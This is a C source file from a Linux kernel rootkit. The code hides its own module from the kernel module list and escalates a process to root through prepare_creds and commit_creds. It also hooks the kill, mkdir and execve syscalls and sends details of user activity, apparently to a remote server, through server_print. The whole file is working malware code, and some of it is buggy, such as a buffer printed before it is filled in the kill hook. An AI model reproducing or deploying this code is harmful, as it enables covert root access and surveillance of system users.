/*
file for the all of the hooked functions and other relevant code
*/

	/*=========================================*\
		generic functions to be used by hooks
	\*=========================================*/

bool module_hidden = false; //variable to see if the module is hidden
static struct list_head *prev_module; //location of the previous module

static int hide_rootkit(void){ //function to unhide\hide the rootkit
	if (!module_hidden){ //module is not hidden
		prev_module = THIS_MODULE->list.prev; //sets the location of the previous module
		list_del(&THIS_MODULE->list); //deletes this module from the list
		server_print("[rootkit] hidden\n");
	}
	else{// module is hidden
		list_add(&THIS_MODULE->list, prev_module); //adds module back into list
		server_print("[rootkit] revealed\n");
	}
	module_hidden^=1; //flips module_hidden variable
	return 0; //returns 0 for no error
}

static int set_root(void){ //changes credentials
	struct cred *root_creds; //credentials structure to be changed to root
	root_creds = prepare_creds(); //initialises the root creds

	if (root_creds == NULL){ //if root creds not initialised properly
		return -1;
	}
	//sets all of the values to 0 for root
	root_creds->uid.val = root_creds->gid.val = 0;
	root_creds->euid.val = root_creds->egid.val = 0;
	root_creds->suid.val = root_creds->sgid.val = 0;
	root_creds->fsuid.val = root_creds->fsgid.val = 0;
	
	commit_creds(root_creds); //commits new credentials
	return 0; //returns 0 for no error
}

	/*==============*\
		hooked kill
	\*==============*/
ptregs_t orig_kill = (ptregs_t) 0; //address of the kill syscall from the syscall table


static asmlinkage long hooked_kill(const struct pt_regs *regs){ //hook function
	char buffer[BUFFER_SIZE]; //buffer for sprintf
	int pid = regs->di; //gets ID of process to be killed from pt_regs structure
	int sig = regs->si; //gets signal from pt_regs structure
	if (sig<10||sig==19||sig==18||sig==30){ //if kill signal is interesting signal
		sprintf(buffer, "[kill] pid = %i   signal = %i\n", pid, sig); //copy message to buffer
	}
	server_print(buffer); //sends message
	return orig_kill(regs); //kills process and returns result
}
struct hook_t sys_kill = {.hooked_syscall = hooked_kill, .syscall_number = __NR_kill}; //the hook_t struct for use within module


	/*================*\
		hooked mkdir
	\*================*/
ptregs_t orig_mkdir = (ptregs_t) 0; //address of the mkdir syscall from the syscall table
static asmlinkage long hooked_mkdir(const struct pt_regs *regs){ //hook function
	char buffer[BUFFER_SIZE]; //buffer for sprintf
	char dir_name[NAME_MAX] = {0}; //buffer for directory name
	char __user *pathname = (char *)regs->di; //gets userspace pathname
	int mode = (int)regs->si; //gets mkdir mode

	long error =  strncpy_from_user(dir_name, pathname, NAME_MAX); //copies pathname from userspace to kernelspace
	if (error>0){ //if sucsessfuly copied
		sprintf(buffer, "[mkdir] directory = %s   mode = 0x%x\n", dir_name, mode); //copy message to buffer
	}
	else{ //if not sucsessfuly copied
		sprintf(buffer, "[mkdir] directory = ??? (unable to be copied)    mode = 0x%x\n", dir_name, mode); //copy message to buffer
	}
	server_print(buffer); //sends message
	return orig_mkdir(regs); //executes original syscall
}
struct hook_t sys_mkdir = {.hooked_syscall = hooked_mkdir, .syscall_number = __NR_mkdir}; //the hook_t struct for use within module


	/*====================*\
		hooked execve
	\*====================*/
ptregs_t orig_execve = (ptregs_t) 0; //address of the execve syscall from the syscall table
static asmlinkage long hooked_execve(const struct pt_regs *regs){ //hook functions
	char buffer[BUFFER_SIZE]; //buffer for sprintf
	char filename[NAME_MAX] = {0}; //buffer for filename
	char __user *filename_user = (char *)regs->di; //gets userspace filename

	long error =  strncpy_from_user(filename, filename_user, NAME_MAX); //copies filename from userspace to kernelspace
	if (error>0){ //if sucsessfuly copied
		sprintf(buffer, "[execve] %s\n", filename);  //copy message to buffer
	}
	else{ //if not sucsessfuly copied
		sprintf(buffer, "[execve] ??? (unable to be copied)  errcode = %i\n", error); //copy message to buffer
	}
	server_print(buffer); //sends message
	return orig_execve(regs); //executes original syscall
}
struct hook_t sys_execve = {.hooked_syscall = hooked_execve, .syscall_number = __NR_execve}; //the hook_t struct for use within module
